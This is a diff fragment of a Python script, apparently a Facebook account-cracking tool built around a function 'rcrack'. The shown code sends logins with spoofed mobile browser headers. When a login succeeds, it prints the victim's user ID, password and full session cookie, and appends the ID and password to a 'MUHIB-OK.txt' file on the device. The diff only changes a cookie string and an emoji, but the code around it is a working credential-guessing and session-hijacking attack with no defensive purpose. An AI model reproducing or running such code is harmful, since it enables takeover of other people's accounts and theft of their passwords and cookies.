@@ -235,7 +235,7 @@ def rcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-            # 'cookie': 'datr=-9jDYzV_hqwfw3Fbn3TQULSv; sb=-9jDYzbc3N8QCJ7Se8GjSs2m; fr=0Tlv0YCrMlsnIicq9..Bjw9k5.bM.AAA.0.0.Bjw9lH.AWV5uOwr4gc',
+            # 'cookie': 'datr=-9jDYzV_hqwfw3Fbn3TQULSv; sb=-9jDYzbc3N8QCJ7Se8GjSs2m; fr=0Tlv0YCrMlsnIicq9..Bjw9k5.bM.AAA.0.0.Bjw9lN.AWUeOGo39XI',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -250,7 +250,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[MUHIB-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🧨]\033[1;92m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[MUHIB-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🖤]\033[1;92m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/MUHIB-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
